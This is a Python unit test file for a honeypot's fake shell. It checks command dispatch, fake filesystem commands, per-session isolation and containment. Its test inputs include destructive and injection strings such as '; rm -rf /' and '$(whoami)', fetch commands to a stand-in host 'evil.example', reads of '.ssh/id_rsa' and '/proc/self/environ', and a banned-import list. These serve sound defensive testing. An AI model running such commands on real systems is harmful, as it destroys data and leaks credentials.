"""Focused tests for the fake shell architecture (honeypot.shell).

These validate the command dispatcher, argument parsing, filesystem commands,
per-session isolation, and — most importantly — that commands cannot escape the
fake environment (no subprocess, no host filesystem, no network).
"""

import unittest

from honeypot.shell import FakeShell, COMMAND_REGISTRY
from honeypot.session import Session


def shell_for(ip="10.0.0.1"):
    s = Session(source_ip=ip)
    return FakeShell(s), s


class TestDispatcher(unittest.TestCase):
    def test_known_command_dispatches(self):
        sh, _ = shell_for()
        self.assertEqual(sh.execute("pwd"), "/home/user1")

    def test_unknown_command_returns_error(self):
        sh, _ = shell_for()
        self.assertIn("command not found", sh.execute("definitely-not-a-real-cmd"))

    def test_empty_and_blank_lines(self):
        sh, _ = shell_for()
        self.assertEqual(sh.execute(""), "")
        self.assertEqual(sh.execute("   "), "")

    def test_malformed_quote_does_not_crash(self):
        sh, _ = shell_for()
        out = sh.execute('echo "unterminated')
        self.assertTrue("bash:" in out or out.strip())

    def test_malformed_input_never_raises(self):
        sh, _ = shell_for()
        weird_lines = [
            "; rm -rf /",
            "`id`",
            "$(whoami)",
            "a | b | c",
            "echo 'a' 'b'",
            "cat /etc/passwd ; rm -rf /",
            "echo hello > /tmp/x.txt > /tmp/y.txt",
        ]
        for line in weird_lines:
            with self.subTest(line=line):
                try:
                    sh.execute(line)
                except Exception as exc:  # noqa: BLE001
                    self.fail(f"malformed line raised: {exc!r}")


class TestExistingCommands(unittest.TestCase):
    def test_pwd(self):
        sh, _ = shell_for()
        self.assertEqual(sh.execute("pwd"), "/home/user1")

    def test_whoami(self):
        sh, _ = shell_for()
        self.assertEqual(sh.execute("whoami"), "user1")

    def test_hostname(self):
        sh, _ = shell_for()
        self.assertEqual(sh.execute("hostname"), "ubuntu")

    def test_id(self):
        sh, _ = shell_for()
        self.assertIn("user1", sh.execute("id"))

    def test_uname(self):
        sh, _ = shell_for()
        self.assertIn("Linux", sh.execute("uname -a"))

    def test_clear(self):
        sh, _ = shell_for()
        self.assertTrue(sh.execute("clear"))

    def test_cd_ls_cat(self):
        sh, _ = shell_for()
        sh.execute("cd /etc")
        self.assertEqual(sh.session.cwd, "/etc")
        listing = sh.execute("ls")
        self.assertIn("passwd", listing)
        content = sh.execute("cat passwd")
        self.assertIn("root", content)

    def test_mkdir_touch_rm_echo(self):
        sh, _ = shell_for()
        self.assertEqual(sh.execute("mkdir newdir"), "")
        self.assertIn("newdir", sh.execute("ls"))
        sh.execute("touch newdir/a.txt")
        sh.execute("echo hello > newdir/a.txt")
        self.assertEqual(sh.execute("cat newdir/a.txt"), "hello")
        sh.execute("rm newdir/a.txt")
        self.assertIn("No such file", sh.execute("cat newdir/a.txt"))

    def test_echo_output(self):
        sh, _ = shell_for()
        self.assertEqual(sh.execute("echo hello world"), "hello world")

    def test_exit_sets_flag(self):
        sh, _ = shell_for()
        sh.execute("exit")
class TestNewCommands(unittest.TestCase):
    def test_tree(self):
        sh, _ = shell_for()
        out = sh.execute("tree /home/user1")
        self.assertIn("notes.txt", out)

    def test_find(self):
        sh, _ = shell_for()
        out = sh.execute("find /etc -name passwd")
        self.assertIn("/etc/passwd", out)

    def test_grep(self):
        sh, _ = shell_for()
        out = sh.execute("grep root /etc/passwd")
        self.assertIn("root", out)

    def test_grep_no_match(self):
        sh, _ = shell_for()
        self.assertEqual(sh.execute("grep zzz /etc/passwd"), "")

    def test_head_tail(self):
        sh, _ = shell_for()
        out = sh.execute("head -2 /etc/passwd")
        self.assertEqual(len(out.splitlines()), 2)
        tail = sh.execute("tail -1 /etc/passwd")
        self.assertEqual(len(tail.splitlines()), 1)

    def test_ps(self):
        sh, _ = shell_for()
        self.assertIn("bash", sh.execute("ps"))

    def test_env(self):
        sh, _ = shell_for()
        self.assertIn("USER=user1", sh.execute("env"))

    def test_history(self):
        sh, _ = shell_for()
        self.assertIn("ls", sh.execute("history"))

    def test_which(self):
        sh, _ = shell_for()
        self.assertIn("/usr/bin/ls", sh.execute("which ls"))

    def test_wc(self):
        sh, _ = shell_for()
        out = sh.execute("wc -l /etc/passwd")
        self.assertEqual(len(out.split()), 2)  # count + filename

    def test_stat(self):
        sh, _ = shell_for()
        self.assertIn("Size:", sh.execute("stat /etc/passwd"))

    def test_uptime_date_free(self):
        sh, _ = shell_for()
        self.assertIn("up", sh.execute("uptime"))
        self.assertIn("UTC", sh.execute("date"))
        self.assertIn("Mem:", sh.execute("free"))

    def test_df_ps(self):
        sh, _ = shell_for()
        self.assertIn("/", sh.execute("df"))
        self.assertIn("PID", sh.execute("ps"))

    def test_help_lists_commands(self):
        sh, _ = shell_for()
        out = sh.execute("help")
        self.assertIn("ls", out)
        self.assertIn("grep", out)


class TestFilesystemPaths(unittest.TestCase):
    def test_relative_paths(self):
        sh, _ = shell_for()
        sh.execute("cd /etc")
        self.assertIn("root", sh.execute("cat passwd"))

    def test_absolute_paths(self):
        sh, _ = shell_for()
        self.assertIn("root", sh.execute("cat /etc/passwd"))

    def test_nonexistent_path(self):
        sh, _ = shell_for()
        self.assertIn("No such file", sh.execute("cat /nonexistent/x.txt"))

    def test_directory_vs_file(self):
        sh, _ = shell_for()
        self.assertIn("Is a directory", sh.execute("cat /etc"))

    def test_cd_dotdot(self):
        sh, _ = shell_for()
        sh.execute("cd /home/user1")
        sh.execute("cd ..")
        self.assertEqual(sh.session.cwd, "/home")

    def test_ls_flags(self):
        sh, _ = shell_for()
        out = sh.execute("ls -la /home/user1")
        self.assertIn("notes.txt", out)
        # -a reveals hidden entries like the .bashrc fixture.
        self.assertIn(".bashrc", out)

    def test_ls_directory_target(self):
        sh, _ = shell_for()
        out = sh.execute("ls /etc")
        self.assertIn("passwd", out)

    def test_cd_nonexistent(self):
        sh, _ = shell_for()
        self.assertIn("No such file", sh.execute("cd /does/not/exist"))
        self.assertEqual(sh.session.cwd, "/home/user1")  # unchanged


class TestIsolation(unittest.TestCase):
    def test_two_sessions_independent(self):
        sh1, s1 = shell_for("10.0.0.1")
        sh2, s2 = shell_for("10.0.0.2")
        sh1.execute("touch /home/user1/only_a.txt")
        self.assertIn("only_a.txt", sh1.execute("ls /home/user1"))
        self.assertNotIn("only_a.txt", sh2.execute("ls /home/user1"))
        self.assertIsNot(s1.fake_filesystem, s2.fake_filesystem)

    def test_cwd_isolated(self):
        sh1, s1 = shell_for("10.0.0.1")
        sh2, s2 = shell_for("10.0.0.2")
        sh1.execute("cd /etc")
        self.assertEqual(s1.cwd, "/etc")
        self.assertEqual(s2.cwd, "/home/user1")


class TestSecurity(unittest.TestCase):
    def test_does_not_reach_real_fs(self):
        sh, _ = shell_for()
        # A typical host-private path absent from the fake fs must not resolve.
        self.assertIn("No such file", sh.execute("cat /home/user1/.ssh/id_rsa"))
        self.assertIn("No such file", sh.execute("cat /proc/self/environ"))

    def test_suspicious_commands_do_not_execute(self):
        sh, _ = shell_for()
        for cmd in ["wget http://evil.example/x", "curl http://evil.example",
                    "ssh root@evil.example", "scp x root@evil.example",
                    "sudo whoami", "chmod 777 /etc/passwd", "chown root /etc/passwd"]:
            with self.subTest(cmd=cmd):
                try:
                    sh.execute(cmd)
                except Exception as exc:  # noqa: BLE001
                    self.fail(f"{cmd} raised: {exc!r}")

    def test_shell_module_has_no_unsafe_imports(self):
        import inspect
        mod = __import__("honeypot.shell", fromlist=["x"])
        src = inspect.getsource(mod)
        # Only guard against actual unsafe imports; the module prose mentions
        # "no subprocess / no os" so we must look at import statements.
        for banned in ("import subprocess", "import os", "from subprocess",
                       "import socket", "import urllib", "import requests",
                       "from os", "os.system", "os.popen"):
            self.assertNotIn(banned, src)


if __name__ == "__main__":
    unittest.main()
